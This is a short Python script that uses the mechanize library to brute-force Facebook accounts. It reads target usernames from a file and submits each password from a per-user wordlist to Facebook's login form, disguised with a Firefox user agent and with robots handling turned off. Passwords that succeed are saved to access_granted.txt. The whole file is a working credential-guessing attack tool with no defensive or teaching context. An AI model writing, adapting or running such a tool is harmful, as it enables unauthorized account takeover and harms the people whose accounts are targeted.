import mechanize,os

def treatUser(user):
    path = os.getcwd()
    if path[0] == 'C':
        os.system('cls')
    else:
        os.system('clear')
    for i in user: 
        filename = i
        file = open(f'wordlists/{filename}.txt','r')
        password = file.read()
        password_list = password.split()
        print(i)
        for x in password_list:
            user_and_pass = [i,x]
            bruteForce(user_and_pass)

def bruteForce(user_and_pass):
    user = user_and_pass[0]
    password = user_and_pass[1]
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Firefox')]
    br.open('https://www.facebook.com/login.php')
    br.select_form(nr=0)
    br.form['email'] = user
    br.form['pass'] = password
    sub = br.submit()
    url = sub.geturl()

    if(url == 'https://www.facebook.com/'):
        verified_pass = password
        print(f'> {user} : {verified_pass}')
        file = open("access_granted.txt",'a')
        file.write(f"{user} : {verified_pass}\n")

def getUser():
    file = open('users.txt','r')
    user = file.read()
    file.close()
    user = user.split()
    treatUser(user)
    
    # user = []
    # while True:
    #     user += [input('Informe o user > ')]
    #     op = input('Terminou? y/N > ')
    #     if(op=='y'):
    #         yo(user)
    #         return False

getUser()
